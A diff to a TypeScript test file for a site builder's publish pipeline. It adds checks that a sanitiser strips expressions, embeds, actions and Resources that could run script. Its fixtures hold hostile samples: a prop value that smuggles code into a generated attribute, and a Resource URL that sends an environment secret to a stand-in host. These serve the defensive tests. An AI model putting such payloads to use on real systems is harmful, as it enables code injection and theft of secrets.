@@ -8,9 +8,20 @@ import {
   publishedProjectBundle,
   type PublishedProjectBundle,
 } from "@webstudio-is/protocol";
-import type { Instance, Prop, Resource } from "@webstudio-is/sdk";
+import {
+  ROOT_INSTANCE_ID,
+  createScope,
+  encodeDataSourceVariable,
+  generateResources,
+  type DataSource,
+  type Instance,
+  type Prop,
+  type Resource,
+} from "@webstudio-is/sdk";
+import { generateWebstudioComponent } from "@webstudio-is/react-sdk";
 import {
   ORGANIZEOS_GUARD_LEVEL,
+  findPausedExpressions,
   orgScriptMayRun,
 } from "@organizeos/site-components/org-script";
 import { dropOrgScript } from "./organizeos-org-script";
@@ -22,6 +33,7 @@ import {
 } from "@organizeos/site-components/org-script";
 import { migratePages } from "@webstudio-is/project-migrations/pages";
 import { assertBuildCodeValid } from "./organizeos-code-check";
+import { findGeneratedCodeProblems } from "./organizeos-generated-code";
 
 // The publish workflow sends ORGANIZEOS_GUARD_LEVEL to OrganizeOS as
 // guardLevel, and OrganizeOS launches a Website only from a build whose level
@@ -42,7 +54,7 @@ type Covering = { file: string; path: string[] };
 type Requirement = {
   name: string;
   /** Whether the CLI built from this commit meets it. */
-  holds: () => boolean;
+  holds: () => boolean | Promise<boolean>;
   coveredBy: Covering[];
 };
 
@@ -72,11 +84,13 @@ const bundleOf = ({
   instances,
   props,
   redirect,
+  dataSources = [],
   resources = [],
 }: {
   instances: Array<[string, Instance]>;
   props: Array<[string, Prop]>;
   redirect?: string;
+  dataSources?: Array<[string, DataSource]>;
   resources?: Array<[string, Resource]>;
 }): PublishedProjectBundle => {
   const home = {
@@ -112,7 +126,7 @@ const bundleOf = ({
       },
       props,
       instances,
-      dataSources: [],
+      dataSources,
       resources,
       styleSources: [],
       styleSourceSelections: [],
@@ -248,12 +262,281 @@ const inputValidationHolds = () => {
 const codeCheckTests =
   "packages/sdk-components-organizeos/src/code-check.test.ts";
 
+// A prop and a Resource that may not ship. The modules generated from what
+// ships hold neither, and read no name they do not declare.
+const expressionsLeftOut = async () => {
+  // a Collection's item named like a global, which a Resource may not name
+  const named = encodeDataSourceVariable("first-ds");
+  const published = dropOrgScript(
+    bundleOf({
+      instances: [
+        instance("root", "Body", { children: children("box", "list") }),
+        instance("box", "Box"),
+        instance("list", "ws:collection", { children: children("inner") }),
+        instance("inner", "Box"),
+      ],
+      props: [
+        [
+          "box:title",
+          {
+            id: "box:title",
+            instanceId: "box",
+            name: "title",
+            type: "expression",
+            value: '"x"} data-x={globalThis.pwned = 1',
+          },
+        ],
+        [
+          "list:data",
+          {
+            id: "list:data",
+            instanceId: "list",
+            name: "data",
+            type: "expression",
+            value: "[1]",
+          },
+        ],
+        [
+          "list:item",
+          {
+            id: "list:item",
+            instanceId: "list",
+            name: "item",
+            type: "parameter",
+            value: "first-ds",
+          },
+        ],
+      ],
+      dataSources: [
+        [
+          "first-ds",
+          {
+            type: "parameter",
+            id: "first-ds",
+            name: "process",
+            scopeInstanceId: "list",
+          },
+        ],
+        [
+          "leak-ds",
+          {
+            type: "resource",
+            id: "leak-ds",
+            name: "leak",
+            scopeInstanceId: "root",
+            resourceId: "leak",
+          },
+        ],
+      ],
+      resources: [
+        [
+          "leak",
+          {
+            id: "leak",
+            name: "leak",
+            method: "get",
+            url: `"https://evil.example/?k=" + ${named}.env.PROBE_SECRET`,
+            headers: [],
+          },
+        ],
+      ],
+    })
+  );
+  const { build } = published;
+  const [page] = build.pages.pages;
+  const instances = new Map(build.instances);
+  const props = new Map(build.props);
+  const dataSources = new Map(build.dataSources);
+  const scope = createScope();
+  const modules =
+    generateWebstudioComponent({
+      scope,
+      name: "Page",
+      rootInstanceId: page.rootInstanceId,
+      parameters: [],
+      instances,
+      props,
+      dataSources,
+      metas: new Map(),
+      classesMap: new Map(),
+    }) +
+    generateResources({
+      scope,
+      page,
+      dataSources,
+      props,
+      resources: new Map(build.resources),
+    });
+  // the page's components, which prebuild imports
+  const imports = [
+    'import { Fragment } from "react";',
+    'import { Body, Box } from "@webstudio-is/sdk-components-react";',
+  ].join("\n");
+  return (
+    modules.includes("pwned") === false &&
+    modules.includes("PROBE_SECRET") === false &&
+    JSON.stringify(
+      await findGeneratedCodeProblems(`${imports}\n${modules}`)
+    ) === JSON.stringify({ undeclared: [], shadowed: [] }) &&
+    findPausedExpressions({
+      pages: build.pages.pages,
+      instances,
+      props: props.values(),
+      dataSources,
+      resources: new Map(build.resources),
+    }).length === 0
+  );
+};
+
+// An action that reads a member of its argument, one that reads a member of
+// a variable and one that calls a variable are left out, and one that sets a
+// variable to a plain value stays.
+const actionsLeftOut = async () => {
+  const variable = encodeDataSourceVariable("v");
+  const onClick = (
+    instanceId: string,
+    args: string[],
+    code: string
+  ): [string, Prop] => {
+    const id = `${instanceId}:onClick`;
+    return [
+      id,
+      {
+        id,
+        instanceId,
+        name: "onClick",
+        type: "action",
+        value: [{ type: "execute", args, code }],
+      },
+    ];
+  };
+  const published = dropOrgScript(
+    bundleOf({
+      instances: [
+        instance("root", "Body", {
+          children: children("reads", "member", "call", "sets"),
+        }),
+        instance("reads", "Box"),
+        instance("member", "Box"),
+        instance("call", "Box"),
+        instance("sets", "Box"),
+      ],
+      props: [
+        onClick("reads", ["event"], `${variable} = event.target.value`),
+        onClick("member", [], `${variable} = ${variable}.length`),
+        onClick("call", [], `${variable} = ${variable}()`),
+        onClick("sets", [], `${variable} = 1`),
+      ],
+      dataSources: [
+        [
+          "v",
+          {
+            type: "variable",
+            id: "v",
+            name: "v",
+            scopeInstanceId: "root",
+            value: { type: "number", value: 0 },
+          },
+        ],
+      ],
+    })
+  );
+  return (
+    JSON.stringify(propIds(published)) === JSON.stringify(["sets:onClick"])
+  );
+};
+
+// One of each kind the page module cannot ship while org script is paused:
+// an HTML Embed holding a script, a Markdown Embed, a JSON-LD element, an
+// instance of a component the page does not import, an instance stored with
+// the global root's id, a data source whose id the module uses for something
+// else, a parameter named ref, raw markup, and the site's custom code. Each is
+// left out, and a plain element and a plain variable stay.
+const unshippableLeftOut = () => {
+  const parameter = (
+    instanceId: string,
+    name: string,
+    value: string
+  ): [string, Prop] => {
+    const id = `${instanceId}:${name}`;
+    return [id, { id, instanceId, name, type: "parameter", value }];
+  };
+  const variable = (id: string): [string, DataSource] => [
+    id,
+    {
+      type: "variable",
+      id,
+      name: "v",
+      scopeInstanceId: "root",
+      value: { type: "string", value: "" },
+    },
+  ];
+  const code = "<script>1</script>";
+  const bundle = bundleOf({
+    instances: [
+      instance("root", "Body", {
+        children: children(
+          "embed",
+          "markdown",
+          "json",
+          "unknown",
+          ROOT_INSTANCE_ID,
+          "box"
+        ),
+      }),
+      instance("embed", "HtmlEmbed"),
+      instance("markdown", "MarkdownEmbed"),
+      instance("json", "JsonLd"),
+      instance("unknown", "x:script"),
+      instance(ROOT_INSTANCE_ID, "Box"),
+      instance("box", "Box"),
+    ],
+    props: [
+      prop("embed", "code", code),
+      prop("markdown", "code", "a"),
+      prop("json", "code", "{}"),
+      prop("box", "id", "box"),
+      prop("box", "dangerouslySetInnerHTML", "<b>1</b>"),
+      parameter("box", "ref", "held"),
+      parameter("box", "title", "Box"),
+    ],
+    dataSources: [variable("held"), variable("Box")],
+  });
+  const published = dropOrgScript({
+    ...bundle,
+    build: {
+      ...bundle.build,
+      pages: {
+        ...bundle.build.pages,
+        meta: { ...bundle.build.pages.meta, code },
+      },
+      projectSettings: { meta: { siteName: "Site", code }, compiler: {} },
+    },
+  });
+  return (
+    JSON.stringify(instanceIds(published)) ===
+      JSON.stringify(["root", "box"]) &&
+    JSON.stringify(propIds(published)) === JSON.stringify(["box:id"]) &&
+    JSON.stringify(published.build.dataSources.map(([id]) => id)) ===
+      JSON.stringify(["held"]) &&
+    published.build.pages.meta?.code === undefined &&
+    published.build.projectSettings?.meta.code === undefined
+  );
+};
+
 const unsafeValuesTests =
   "packages/cli/src/organizeos-org-script.unsafe-values.test.ts";
 const prebuildTests = "packages/cli/src/prebuild.test.ts";
 
 const workflowTests = "packages/cli/src/organizeos-publish-workflow.test.ts";
 const unsafeValues = "dropOrgScript leaves unsafe values out";
+const leftOutExpressions = "dropOrgScript leaves expressions out";
+const orgScriptTests = "packages/cli/src/organizeos-org-script.test.ts";
+const prebuildOwnScript = ["prebuild", "leaves an org's own script out"];
+const prebuildExpressions = [
+  ...prebuildOwnScript,
+  "expressions, Resources and page settings",
+];
 const prebuildUnsafeValues = ["prebuild", "leaves unsafe values out"];
 
 const levelOne: Requirement[] = [
@@ -493,6 +776,274 @@ const levelOne: Requirement[] = [
       },
     ],
   },
+  {
+    name: "expressions, Resources and page settings that could run script are left out",
+    holds: expressionsLeftOut,
+    coveredBy: [
+      {
+        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
+        path: [
+          "findPausedExpressions",
+          "pauses a name the page module does not declare where it is written, and keeps it inside its Collection",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          leftOutExpressions,
+          "drops an expression that may not run where it is written, an XML page's included, and counts it",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          leftOutExpressions,
+          "writes undefined for a text child that may not run, and keeps the other children in place",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          leftOutExpressions,
+          "drops a page setting that may not run: the title becomes empty, the redirect goes with its 3xx status, and so does a custom entry",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          leftOutExpressions,
+          "drops a Resource that may not run with its data sources and the resource props that name it, and counts it",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildExpressions,
+          "leaves out every expression and page setting that could run script, and every name the module does not declare where it is written",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildExpressions,
+          "leaves out every Resource that could run script, and keeps one whose every part may run, one that reads another Resource's data among them",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildExpressions,
+          "reads each page as prebuild publishes it: fixtures, block templates, site templates and the registry's templates",
+        ],
+      },
+      // D7: a build that would materialize MDX is refused, and one it lets
+      // through publishes no Content Block content
+      {
+        file: "packages/cli/src/organizeos-org-script.test.ts",
+        path: [
+          "refuseMdxWhilePaused",
+          "reads as Markdown every asset prebuild would materialize",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildExpressions,
+          "publishes no Content Block content from a build it lets through",
+        ],
+      },
+      // the builder's server computes a form's draft
+      {
+        file: "packages/project-build/src/runtime/data.organizeos.test.ts",
+        path: [
+          "while org script is paused",
+          "a form's draft compiles no field the pause refuses, and refuses it",
+        ],
+      },
+      // what ships declares every name it reads, or the publish fails
+      {
+        file: "packages/cli/src/organizeos-generated-code.test.ts",
+        path: [
+          "checkGeneratedModule",
+          "fails while org script is paused, naming the module and the names",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildExpressions,
+          "checks every page and server module it generates, and a module that may not ship fails the publish",
+        ],
+      },
+    ],
+  },
+  {
+    name: "embeds, raw markup, custom code, element references, and instances and data sources the page module cannot ship are left out",
+    holds: unshippableLeftOut,
+    coveredBy: [
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript",
+          "drops a script embed with its descendants, props, scoped data and the parent's reference",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript",
+          "drops a Markdown Embed with a javascript: link, whatever its code, with its subtree",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: ["dropOrgScript", "drops a JSON-LD element and counts it"],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "raw HTML in the runtime packages",
+          "publishing leaves out each component that uses it",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript",
+          "drops the dangerouslySetInnerHTML prop of any instance, whatever its type, and keeps the instance",
+        ],
+      },
+      {
+        file: orgScriptTests,
+        path: [
+          "dropOrgScript",
+          "clears the custom code in the project's settings too, and keeps the rest of them",
+        ],
+      },
+      {
+        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
+        path: [
+          "componentMayShip",
+          "is false for any other, the builder's global root included",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          unsafeValues,
+          "drops an instance whose component the published page does not import, with what is inside it, counts it, and keeps the registered ones",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          unsafeValues,
+          "keeps the global data sources, and leaves out an instance stored with the global root's id",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          unsafeValues,
+          "drops a data source whose id the page module uses for something else when nothing else is left out, and counts it",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          unsafeValues,
+          "drops a parameter or an expression named ref, counts it, and keeps one of another type",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [...prebuildOwnScript, "leaves out HTML Embeds and custom code"],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "leaves out Markdown Embeds and the SVG animate and set elements",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "a dangerouslySetInnerHTML prop ships no markup, and its element stays",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "the org script in projectSettings is dropped and reported",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "leaves out an instance whose component the page does not import",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "keeps the global data sources when it leaves out an instance stored with the global root's id",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "leaves out a data source whose id the page module uses for something else, and what names it reads nothing",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          ...prebuildOwnScript,
+          "leaves out a parameter or an expression named ref, so no ref names a data source",
+        ],
+      },
+    ],
+  },
+  {
+    name: "actions that could run script or reach a host object are left out",
+    holds: actionsLeftOut,
+    coveredBy: [
+      {
+        file: "packages/sdk-components-organizeos/src/org-script.test.ts",
+        path: [
+          "actionMayRun",
+          "refuses member access and calls, however they are written",
+        ],
+      },
+      {
+        file: unsafeValuesTests,
+        path: [
+          "dropOrgScript leaves unsafe values out",
+          "drops an action that could run script or reach the page, on any prop of any instance, an XML page's included, and counts it as an unsafe action",
+        ],
+      },
+      {
+        file: prebuildTests,
+        path: [
+          "prebuild",
+          "leaves out an action that could run script or reach the page, and keeps one a template writes",
+        ],
+      },
+      {
+        file: "apps/builder/app/canvas/organizeos-org-script.props.test.tsx",
+        path: [
+          "the canvas computes an action",
+          "runs none of the refused actions, and gives them no handler that does anything",
+        ],
+      },
+    ],
+  },
 ];
 
 const present = levelOne.filter(
@@ -683,10 +1234,10 @@ describe("the covering-test lookup", () => {
 });
 
 describe("ORGANIZEOS_GUARD_LEVEL", () => {
-  // The level stays 0 while level-1 work is not yet in this repository; the
-  // change that lands it removes this pin and raises the level.
-  test("stays 0 while level-1 work is not yet in this repository", () => {
-    expect(ORGANIZEOS_GUARD_LEVEL).toBe(0);
+  // Every level-1 requirement holds and is covered, so the level is 1; a
+  // change to it is a reviewed change that edits this pin.
+  test("is 1, with every level-1 requirement in this repository", () => {
+    expect(ORGANIZEOS_GUARD_LEVEL).toBe(1);
   });
 
   test("is an integer from 0 to 32767, and at most 1", () => {
@@ -699,8 +1250,8 @@ describe("ORGANIZEOS_GUARD_LEVEL", () => {
 
   test.each(
     present.map((requirement) => [requirement.name, requirement] as const)
-  )("level 1: %s holds", (_name, requirement) => {
-    expect(requirement.holds()).toBe(true);
+  )("level 1: %s holds", async (_name, requirement) => {
+    expect(await requirement.holds()).toBe(true);
   });
 
   test.each(
@@ -714,10 +1265,10 @@ describe("ORGANIZEOS_GUARD_LEVEL", () => {
     expect(await isCovered(covering)).toBe(true);
   });
 
-  test("a level of 1 or more means every level-1 requirement holds", () => {
+  test("a level of 1 or more means every level-1 requirement holds", async () => {
     if (ORGANIZEOS_GUARD_LEVEL >= 1) {
       for (const requirement of levelOne) {
-        expect(requirement.holds(), requirement.name).toBe(true);
+        expect(await requirement.holds(), requirement.name).toBe(true);
         expect(requirement.coveredBy.length, requirement.name).toBeGreaterThan(
           0
         );
